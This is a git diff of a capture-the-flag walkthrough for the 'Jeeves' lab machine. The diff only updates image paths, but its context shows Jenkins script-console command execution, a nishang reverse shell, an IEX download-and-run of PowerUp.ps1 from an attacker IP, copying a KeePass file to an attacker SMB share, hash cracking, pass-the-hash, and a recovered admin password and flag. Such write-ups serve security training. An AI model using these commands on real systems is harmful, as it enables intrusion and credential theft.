@@ -26,7 +26,7 @@ As I run a sample command `whoami` I get the output see the screenshot for resul
 cmd = "whoami"
 println cmd.execute().txt
 ```
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_3.png)
+![](images/2025-02-09_3.png)
 
 <!-- I search for oneline shell and found the github of `nishang` and i cloned the entired repo to my /opt and copied the Invoke-PowershellTcp.ps1 copy the highlighted line down to the bottom of the script and change the ip and port. -->
 
@@ -184,7 +184,7 @@ nc -lvnp 8001
 ```
 Run the script onliner on the scrip consol of `jenkins` and we get a shell.
 
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_4.png)
+![](images/2025-02-09_4.png)
 
 ### User flag
 ```bash
@@ -206,10 +206,10 @@ python3 -m http.server 8000
 IEX(New-Object Net.WebClient).downloadString('http://10.10.16.16:8000/PowerUp.ps1')
 ```
 After run the Command at the bottom of the script `Invokde-AllChecks`
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_5.png)
+![](images/2025-02-09_5.png)
 
 In the user `kohsuke` Documents directory I found a database passkey file that I can copy to my attack machine and work with it.
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_6.png)
+![](images/2025-02-09_6.png)
 
 I will use the `impacket-smbserver` to mount share folder and transfer over the file to my attacker machine.
 
@@ -222,7 +222,7 @@ On the victim machine we can run
 ```bash
 New-PSDrive -Name "FollowOnX" -PSProvider "FileSystem" -Root "\\10.10.16.16\PleaseSubscribe"
 ```
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_7.png)
+![](images/2025-02-09_7.png)
 
 I can now navigate to the folder by
 ```bash
@@ -235,7 +235,7 @@ Now I can copy the file `CEH.kdbx` to the shared smb folder and access it on the
 cp C:\Users\kohsuke\Documents\CEH.kdbx .
 ```
 As you can see I copied the file to the attacker machine successfully.
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_8.png)
+![](images/2025-02-09_8.png)
 
 After running `keepass2john` on **CEH.kdbx**, I extracted the hash and successfully cracked it using `hashcat`. The recovered password, `moonshine1`, was then used to access the KeePass database by running:
 ```bash
@@ -243,7 +243,7 @@ keepass2john CEH.kdbx
 ```
 Upon entering the password moonshine1, I successfully logged in and retrieved the Administrator password: `S1TjAtJHKsugh9oC4VZl`.
 
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_9.png)
+![](images/2025-02-09_9.png)
 
 ## Pass The Hash
 I copied the passwords for `administrator` and the backup which the username is just a `?` and it looks like its an `NTLM HASH` and saved it to a file.
@@ -269,14 +269,14 @@ But it did not work so I tried PASS the NTLM Hash
 ```
 once pass the hash we get root access.
 
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_10.png)
+![](images/2025-02-09_10.png)
 Upon accessing the Administrator desktop, I discovered a file named **hm.txt** and initially assumed it contained the root flag. However, after opening it, I realized that was not the case. The file itself hinted that I needed to dig deeper.
 
 By analyzing alternate **data streams (ADS)**, I found that **hm.txt** contained a hidden **root.txt** file. Running `dir /r` revealed the presence of the data stream, but it did not immediately display the root flag. The next challenge was determining how to access the hidden content.
 ```bash
 dir /r
 ```
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_11.png)
+![](images/2025-02-09_11.png)
 I used the powershell stream command to get the content of the root.txt
 
 ```bash
@@ -286,4 +286,4 @@ powershel (Get-Content hm.txt -Stream root.txt)
 ```bash
 afbc5bd4b615a60648cec41c6ac92530
 ```
-![](../../Assets/walktrhough-assets/jeeves/2025-02-09_12.png)
+![](images/2025-02-09_12.png)
